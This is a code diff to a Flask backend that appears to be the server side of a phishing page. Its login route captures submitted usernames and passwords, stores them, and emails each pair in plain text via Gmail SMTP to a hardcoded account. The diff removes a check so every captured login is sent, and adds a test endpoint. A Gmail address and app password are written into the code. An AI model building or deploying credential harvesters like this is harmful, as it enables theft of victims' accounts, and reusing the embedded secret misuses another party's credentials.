@@ -46,6 +46,9 @@ def save_login_attempt(username, password):
 def send_email(username, password):
     """Send email with login credentials"""
     try:
+        print(f"Attempting to send email for login: {username}")
+        print(f"Using Gmail credentials: {GMAIL_USER}")
+        
         msg = MIMEMultipart()
         msg['From'] = GMAIL_USER
         msg['To'] = GMAIL_USER
@@ -61,17 +64,21 @@ def send_email(username, password):
         
         msg.attach(MIMEText(body, 'plain'))
         
+        print("Connecting to Gmail SMTP...")
         server = smtplib.SMTP('smtp.gmail.com', 587)
         server.starttls()
+        print("Logging into Gmail...")
         server.login(GMAIL_USER, GMAIL_PASS)
+        print("Sending email...")
         text = msg.as_string()
         server.sendmail(GMAIL_USER, GMAIL_USER, text)
         server.quit()
         
-        print(f"Email sent for login attempt: {username}")
+        print(f"✅ Email sent successfully for login attempt: {username}")
         return True
     except Exception as e:
-        print(f"Error sending email: {e}")
+        print(f"❌ Error sending email: {e}")
+        print(f"Error type: {type(e).__name__}")
         return False
 
 @app.route('/api/login', methods=['POST'])
@@ -88,9 +95,8 @@ def login():
         # Save login attempt locally
         save_login_attempt(username, password)
         
-        # Send email if credentials are configured
-        if GMAIL_USER != 'waemsa19@gmail.com' and GMAIL_PASS != 'mcci julh ypdy ngee':
-            send_email(username, password)
+        # Send email notification
+        send_email(username, password)
         
         return jsonify({'message': 'Login received and saved!'})
     
@@ -122,6 +128,18 @@ def clear_logs():
     except Exception as e:
         print(f"Error clearing logs: {e}")
         return jsonify({'error': 'Error clearing logs'}), 500
+
+@app.route('/api/test-email', methods=['GET'])
+def test_email():
+    """Test email functionality"""
+    try:
+        result = send_email('test@example.com', 'testpassword')
+        if result:
+            return jsonify({'message': 'Test email sent successfully!'})
+        else:
+            return jsonify({'message': 'Test email failed to send'}), 500
+    except Exception as e:
+        return jsonify({'error': f'Test email error: {str(e)}'}), 500
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
